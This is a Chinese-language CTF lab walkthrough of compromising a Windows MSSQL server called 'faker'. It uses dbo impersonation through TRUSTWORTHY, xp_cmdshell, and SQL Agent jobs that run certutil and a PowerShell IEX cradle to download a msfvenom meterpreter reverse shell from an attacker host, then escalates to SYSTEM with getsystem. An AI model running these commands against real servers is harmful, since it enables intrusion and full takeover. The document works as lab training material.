---
title: MazeSec faker
date: 2025-11-05 21:37:34
permalink: /pages/maze-faker/
categories:
  - 渗透
tags:
  - sysadmin
  - potato
author: 
  name: the0n3
  link: https://the0n3.top
---


提示：初始凭证db-user:whoami

提示：user的flag在c:/根目录下


## 初始信息收集

存活主机扫描

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ sudo arp-scan -l                     
...
192.168.219.141 00:0c:29:dd:63:d7       VMware, Inc.
```

全端口扫描，仅开放了1433端口

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ fscan -h 192.168.219.141 -nobr -p 1-65535
...
[8.7s] [*] 端口开放 192.168.219.141:1433
```


## 数据库连接

使用impacket mssqlclient连接数据库

```bash
impacket-mssqlclient db-user@192.168.219.141 -windows-auth
```

![](/medias/maze-faker/1.png)

### guest用户信息收集

查看当前`guest`用户的权限

```sql
-- 检查当前用户是否属于SQL Server的最高服务器级别角色 sysadmin
SQL (faker\db-user  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
0   
-- 检查当前用户是否属于当前数据库的数据库所有者角色 db_owner
SQL (faker\db-user  guest@master)> SELECT IS_MEMBER('db_owner'); 
0   
```


### faker用户信息收集


收集信息，找到一个faker数据库，一个Notes表

```sql
-- 列出所有数据库
SQL (faker\db-user  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb     
faker    

-- 使用faker数据库
SQL (faker\db-user  guest@master)> USE faker;
ENVCHANGE(DATABASE): Old Value: master, New Value: faker
INFO(db-server): Line 1: 已将数据库上下文更改为 "faker"。

-- 列出faker数据库中的所有用户表
SQL (faker\db-user  faker\db-user@faker)> SELECT name FROM faker.sys.objects WHERE type = 'U';
name    
-----   
Notes  
```

![](/medias/maze-faker/2.png)




查看表结构，表内容

```sql
SQL (faker\db-user  faker\db-user@faker)> SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME = 'Notes';
COLUMN_NAME   DATA_TYPE   
-----------   ---------   
NoteID        int         

NoteContent   nvarchar    

SQL (faker\db-user  faker\db-user@faker)> SELECT * FROM Notes;
NoteID   NoteContent                     
------   -----------------------------   
     1   为庆祝T1进入决赛，此数据库已经开启TRUSTWORTHY   
```

查看当前`faker\db-user`用户的权限，faker用户是db_owner角色，但不是sysadmin角色

```sql
SQL (faker\db-user  faker\db-user@faker)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0   

SQL (faker\db-user  faker\db-user@faker)> SELECT IS_MEMBER('db_owner');
    
-   
1
```


## 模拟dbo角色

提示开启了TRUSTWORTHY，搜下mssql相关文章[MSSQL渗透备忘录](https://blog.csdn.net/qq_40710190/article/details/125667019)

如果模拟`dbo`用户成功，并且`TRUSTWORTHY`属性为1，可以给其他用户添加`sysadmin`权限，拿到`sysadmin`权限的shell

![](/medias/maze-faker/4.png)

faker、msdb库都有TRUSTWORTHY


```sql
SQL (faker\db-user  faker\db-user@faker)> select name, is_trustworthy_on from sys.databases
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

faker                    1   
```


![](/medias/maze-faker/3.png)


前面知道，`faker\db-user`用户是db_owner角色，可以模拟`dbo`用户，dbo角色有sysadmin服务器级用户

```sql
SQL (faker\db-user  faker\db-user@faker)> EXECUTE AS USER = 'dbo';
SQL (FAKER\Administrator  dbo@faker)> SELECT USER_NAME();
      
---   
dbo   

SQL (FAKER\Administrator  dbo@faker)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1   
```

![](/medias/maze-faker/5.png)

不过，这里dbo角色已经有了`sysadmin`权限，还有必要给`faker\db-user`用户添加属性吗？

## 开启xp_cmdshell

尝试开启xp_cmdshell，执行系统命令

```sql
SQL (FAKER\Administrator  dbo@faker)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(db-server): Line 196: 配置选项 'show advanced options' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
SQL (FAKER\Administrator  dbo@faker)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(db-server): Line 196: 配置选项 'xp_cmdshell' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
SQL (FAKER\Administrator  dbo@faker)> EXEC xp_cmdshell 'whoami';
output                   
----------------------   
nt service\mssqlserver   

NULL   
```

![](/medias/maze-faker/6.png)

拿到user flag

```sql
SQL (FAKER\Administrator  dbo@faker)> EXEC xp_cmdshell 'type C:\flag\user.txt';
output                             
--------------------------------   
880e66eec0d8b05645bb027b77948c92   

NULL                               

notes:the agent is running         
```


## MSSQL Agent Job提权

flag里提示 `notes:the agent is running`，搜索`mssql agent利用`  


找到`【技术分享】MSSQL注入时通过Agent Job执行命令的方法`这种利用方式，然后拷打AI就给出了利用方式

![](/medias/maze-faker/7.png)


收集主机系统信息，64位Windows Server 2022


```plaintext
主机名:           DB-SERVER                                                             
OS 名称:          Microsoft Windows Server 2022 Datacenter                             
系统类型:         x64-based PC                                                           
```

msf生成正向shell exe，agent job定时任务下载并执行exe，上线msf

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 496 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

msf监听跑起来

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ msfconsole 
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(multi/handler) > set rhost 192.168.219.141
rhost => 192.168.219.141
msf exploit(multi/handler) > run
```

![](/medias/maze-faker/10.png)

python开启web服务

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ python3 -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
```


agent job创建

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = 'TestDownload';
EXEC sp_add_jobstep @job_name = 'TestDownload', @step_name = 'Download File', @subsystem = 'CMDEXEC', @command = 'certutil -urlcache -split -f http://192.168.219.130/shell.exe C:\\Windows\\Temp\\shell.exe', @on_success_action = 1;
EXEC sp_add_jobserver @job_name = 'TestDownload';
EXEC sp_add_jobschedule @job_name = 'TestDownload', @name = 'RunOnceNow', @freq_type = 1;
EXEC sp_start_job 'TestDownload';
```

![](/medias/maze-faker/8.png)

可以看到下载请求

![](/medias/maze-faker/9.png)

验证发现temp目录似乎不可写，根目录也不可写

![](/medias/maze-faker/11.png)

直接powershell脚本上线，无文件落地内存加载，msf换成反弹shell，正向shell一直没动静

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.219.130 LPORT=4444 -f psh-reflection -o shell.ps1
```

msf监听改成反弹shell

```bash
┌──(npc㉿kali)-[~/hackmyvm/faker]
└─$ msfconsole
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.219.130
lhost => 192.168.219.130
msf exploit(multi/handler) > 
```

agent job创建执行powershell脚本

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = N'RevShell';
EXEC sp_add_jobstep @job_name = N'RevShell', @step_name = N'Run', @subsystem = N'CMDEXEC', @command = N'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.219.130/shell.ps1'')"', @on_success_action = 1;
EXEC sp_add_jobserver @job_name = N'RevShell';
EXEC sp_add_jobschedule @job_name = N'RevShell', @name = N'Now', @freq_type = 1;
EXEC sp_start_job N'RevShell';
```

## system提权

拿到meterpreter shell，当前是sqlserveragent用户

```bash
meterpreter > getuid
Server username: NT Service\SQLSERVERAGENT
```

进入shell环境

```bash
meterpreter > shell
Process 1692 created.
Channel 1 created.

C:\Windows\system32>chcp 65001
chcp 65001

C:\Windows\system32>whoami /all
whoami /all

User Name                 SID                                                           
========================= ==============================================================
nt service\sqlserveragent S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
```

其中`SeImpersonatePrivilege`或`SeCreateGlobalPrivilege`可以用来模拟其他用户（system）的token去创建进程

msf已经集成到`getsystem`命令里

```bash
meterpreter > getuid
Server username: NT Service\SQLSERVERAGENT
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ls C:/Users/Administrator/Desktop/root.txt
```